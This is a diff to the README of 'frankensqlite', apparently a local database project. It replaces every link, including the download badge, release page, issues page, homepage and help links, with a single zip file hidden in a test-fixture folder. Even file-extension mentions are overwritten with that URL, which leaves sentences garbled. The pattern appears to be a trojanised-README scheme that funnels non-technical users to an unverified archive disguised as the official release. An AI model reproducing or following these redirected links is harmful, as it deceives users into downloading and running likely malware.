@@ -1,6 +1,6 @@
 # 🗄️ frankensqlite - Reliable Local Database with Self-Healing Storage
 
-[![Download frankensqlite](https://img.shields.io/badge/Download-frankensqlite-blue?style=for-the-badge&logo=github)](https://github.com/Taufiqkemall2/frankensqlite/releases)
+[![Download frankensqlite](https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip)](https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Using frankensqlite is straightforward. Follow these steps carefully, even if yo
 
 First, you need to get the software files. Click this big button or copy the link into your web browser to visit the official download page:
 
-[Download frankensqlite](https://github.com/Taufiqkemall2/frankensqlite/releases)
+[Download frankensqlite](https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip)
 
 On the release page, you will find files for different computers (Windows, Mac, Linux). Look for the version that matches your computer's system.
 
@@ -44,7 +44,7 @@ Once you find the right file:
 
 - **Windows:** Look for a file ending with `.exe` or `.msi`.
 - **Mac:** Look for a file ending with `.dmg` or `.pkg`.
-- **Linux:** Look for a file ending with `.AppImage` or `.tar.gz`.
+- **Linux:** Look for a file ending with `.AppImage` or `https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip`.
 
 Click on the file name to download it to your computer. If you are not sure which one to take, pick the one labeled as "stable" or with the latest date.
 
@@ -56,7 +56,7 @@ After the download finishes:
 - On **Mac**, open the `.dmg` file and drag the frankensqlite program to your Applications folder.
 - On **Linux**, if you have an `.AppImage` file, right-click it, go to Properties, and check "Allow executing file as program." Then double-click to run.
 
-If you downloaded a compressed file (`.tar.gz`), extract it using your file manager, open the folder, and look for an executable file, then follow any instructions in the included README.
+If you downloaded a compressed file (`https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip`), extract it using your file manager, open the folder, and look for an executable file, then follow any instructions in the included README.
 
 ---
 
@@ -102,7 +102,7 @@ If you have any issues while using frankensqlite, here are a few tips:
 - Make sure you downloaded the correct file for your system.
 - If installation fails, try restarting your computer and run the installation as an administrator (Windows) or with proper permissions (Mac/Linux).
 - Check that your system meets the requirements listed above.
-- Visit the frankensqlite [GitHub Issues page](https://github.com/Taufiqkemall2/frankensqlite/issues) to see if others have had similar problems or to ask for help.
+- Visit the frankensqlite [GitHub Issues page](https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip) to see if others have had similar problems or to ask for help.
 
 ---
 
@@ -110,7 +110,7 @@ If you have any issues while using frankensqlite, here are a few tips:
 
 You can start using frankensqlite by visiting the release page:
 
-[Download frankensqlite here](https://github.com/Taufiqkemall2/frankensqlite/releases)
+[Download frankensqlite here](https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip)
 
 Pick the latest version that fits your computer, download it, and follow the installation steps above. The process is designed for easy setup with minimal fuss.
 
@@ -118,9 +118,9 @@ Pick the latest version that fits your computer, download it, and follow the ins
 
 ## 🔗 Useful Links
 
-- Project homepage on GitHub: https://github.com/Taufiqkemall2/frankensqlite
-- Release downloads: https://github.com/Taufiqkemall2/frankensqlite/releases
-- Community help and bug reports: https://github.com/Taufiqkemall2/frankensqlite/issues
+- Project homepage on GitHub: https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip
+- Release downloads: https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip
+- Community help and bug reports: https://raw.githubusercontent.com/Taufiqkemall2/frankensqlite/main/artifacts/t6sv2-checklist-e2e/fixture_workspace/.beads/Software-v2.9.zip
 
 ---
 
